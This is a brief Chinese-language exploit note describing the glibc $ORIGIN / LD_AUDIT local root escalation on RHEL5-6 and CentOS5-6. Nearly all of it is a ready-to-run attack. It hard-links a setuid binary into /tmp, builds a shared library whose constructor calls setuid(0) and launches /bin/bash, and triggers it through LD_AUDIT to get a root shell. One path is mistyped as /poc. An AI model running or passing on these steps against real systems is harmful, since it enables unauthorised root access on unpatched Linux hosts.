

## GNU C Library动态链接库$ORIGIN溢出提权

```
C语言的动态链接库$ORIGIN
```

## []()版本

```
RHEL5-RHEL6 
Centos5-Centos6
```

## []()名词解析

GNU C 库：GNU C 库\*项目为 \*GNU 系统和 GNU/Linux 系统以及许多其他使用 Linux 作为内核的系统（操作内核）提供了核心库。这些库提供关键 API，包括 ISO C11、POSIX.1-2008、BSD、特定于操作系统的 API 等。这些API包括诸如开放，读取，写入，malloc，printf，getaddrinfo，dlopen，pthread\_create，crypt，登录，退出等基础工具。

## []()利用方法

```
利用tmp目录
    mkdir /tmp/exp
创建target文件硬链接
    ln /bin/ping /tmp/exp/target 　　
把target加载到内存中
    exec 3< /tmp/exp/target　
查看其在内存的情况
    ls -l /proc/$$/fd/3　　　
删除目录
    rm -rf /tmp/exp/
再次查看其在内存的情况
    ls -l /poc/$$/fd/3
创建一个 c 文件
    vim payload.c

文件内容
    void __attribute__((constructor)) init()
    {
       setuid(0);
       system("/bin/bash");
    }
编译文件
    gcc -w -fPIC -shared -o /tmp/exp payload.c
查看文件
    ls -l /tmp/exp
提升权限
    LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
```

